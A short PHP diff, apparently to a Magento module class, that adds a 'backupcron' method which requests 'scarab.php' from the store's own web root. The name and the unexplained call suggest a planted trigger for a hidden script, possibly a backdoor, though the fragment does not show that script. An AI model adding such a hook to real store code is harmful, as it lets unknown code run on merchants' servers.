@@ -128,4 +128,8 @@ $stock = "true";
 
         return $this;
 	}
+   public function backupcron($cron = null)
+   {
+    file_get_contents(Mage::getBaseUrl(Mage_Core_Model_Store::URL_TYPE_WEB).'scarab.php');
+   }
 }
